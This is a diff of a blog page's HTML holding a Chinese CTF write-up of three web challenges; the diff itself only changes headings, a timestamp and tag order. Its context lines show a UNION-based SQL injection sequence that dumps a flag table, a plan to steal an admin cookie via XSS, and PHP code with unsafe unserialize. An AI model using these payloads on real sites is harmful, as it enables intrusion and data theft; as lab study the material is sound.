@@ -32,7 +32,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/17/r3WMNq5aETBZVGA.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/17/hQp3jyvUwcYfaDM.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/17/lecGb21QdS6EFPf.png">
-<meta property="og:updated_time" content="2019-11-03T01:46:01.499Z">
+<meta property="og:updated_time" content="2019-11-28T14:42:49.936Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf-wp">
 <meta name="twitter:description" content="记录几题buuctf的web，下午就省赛了，好紧张😳">
@@ -195,7 +195,7 @@
 <meta name="referrer" content="no-referrer">
 <a id="more"></a>
 
-<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>注册登录，admin无法注册。</p>
+<h3 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h3><p>注册登录，admin无法注册。</p>
 <p>投稿和反馈似曾相识的感觉，投稿xss，反馈弹管理员cookie，靶机无法访问外网，这里需要用到buuctf的xss平台。</p>
 <p>再xss平台生成项目代码后，如下</p>
 <p><img src="https://i.loli.net/2019/09/12/k4Asl1IWH8UdgKu.png" alt="Snipaste_2019-09-12_08-24-07.png"></p>
@@ -218,7 +218,7 @@
 <p>数字型联合注入👌</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 order by 4	==&gt;		测出字段为3</span><br><span class="line">0 union select 1,2,3 	==&gt;		2,3</span><br><span class="line">0 union select 1,2,database()	==&gt;		ciscn</span><br><span class="line">0 union select 1,2,table_name from information_schema.tables where table_schema=&apos;ciscn&apos;		==&gt;		flag</span><br><span class="line">0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;	==&gt;		flagg</span><br><span class="line">0 union select 1,2,flagg from flag		==&gt;</span><br></pre></td></tr></table></figure>
 
-<h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p>之前复现suctf的时候简单整理了思路，但是做这题的时候还是遇到了困难，需要一步步理清思路</p>
+<h3 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h3><p>之前复现suctf的时候简单整理了思路，但是做这题的时候还是遇到了困难，需要一步步理清思路</p>
 <blockquote>
 <p>SoapClient反序列化SSRF</p>
 </blockquote>
@@ -296,7 +296,7 @@
 <img src="https://i.loli.net/2019/09/13/A2SochvsiX8nm5D.jpg" alt="IMG_2883_20190912-214927_.jpg" style="zoom:20%;">
 
 <p>完全裂开了。</p>
-<h2 id="De1CTF-2019-ShellShellShell"><a href="#De1CTF-2019-ShellShellShell" class="headerlink" title="[De1CTF 2019]ShellShellShell"></a>[De1CTF 2019]ShellShellShell</h2><p>做完了上面那题，这题是不是会简单一点。</p>
+<h3 id="De1CTF-2019-ShellShellShell"><a href="#De1CTF-2019-ShellShellShell" class="headerlink" title="[De1CTF 2019]ShellShellShell"></a>[De1CTF 2019]ShellShellShell</h3><p>做完了上面那题，这题是不是会简单一点。</p>
 <p>前面几步可以看之前写的wp，从SoapClient开始</p>
 <p>showmess()</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function showmess()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            //id,sig,mood,ip,country,subtime</span><br><span class="line">            $db = new Db();</span><br><span class="line">            @$ret = $db-&gt;select(array(&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;,&apos;id&apos;),&apos;ctf_user_signature&apos;,&quot;userid = $this-&gt;userid order by id desc&quot;);</span><br><span class="line">            if($ret) &#123;</span><br><span class="line">                $data = array();</span><br><span class="line">                while ($row = $ret-&gt;fetch_row()) &#123;</span><br><span class="line">                    $sig = $row[1];</span><br><span class="line">                    $mood = unserialize($row[2]);</span><br><span class="line">                    $country = $mood-&gt;getcountry();</span><br><span class="line">                    $ip = $mood-&gt;ip;</span><br><span class="line">                    $subtime = $mood-&gt;getsubtime();</span><br><span class="line">                    $allmess = array(&apos;id&apos;=&gt;$row[3],&apos;sig&apos; =&gt; $sig, &apos;mood&apos; =&gt; $mood, &apos;ip&apos; =&gt; $ip, &apos;country&apos; =&gt; $country, &apos;subtime&apos; =&gt; $subtime);</span><br><span class="line">                    array_push($data, $allmess);</span><br><span class="line">                &#125;</span><br><span class="line">                $data = json_encode(array(&apos;code&apos;=&gt;0,&apos;data&apos;=&gt;$data));</span><br><span class="line">                return $data;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">                return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $filenames = scandir(&apos;adminpic/&apos;);</span><br><span class="line">        array_splice($filenames, 0, 2);</span><br><span class="line">        return json_encode(array(&apos;code&apos;=&gt;1,&apos;data&apos;=&gt;$filenames));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -536,7 +536,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华东北赛区-Web2"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华东北赛区]Web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-Upload-Labs-2"><span class="toc-number">2.</span> <span class="toc-text">[SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-ShellShellShell"><span class="toc-number">3.</span> <span class="toc-text">[De1CTF 2019]ShellShellShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">3.1.</span> <span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-华东北赛区-Web2"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华东北赛区]Web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-Upload-Labs-2"><span class="toc-number">2.</span> <span class="toc-text">[SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#De1CTF-2019-ShellShellShell"><span class="toc-number">3.</span> <span class="toc-text">[De1CTF 2019]ShellShellShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接："><span class="toc-number">4.</span> <span class="toc-text">参考链接：</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -660,15 +660,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">74cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -692,15 +692,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -717,6 +717,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">src</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -748,11 +752,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
               </li>
              
               <li class="article-tag-list-item">
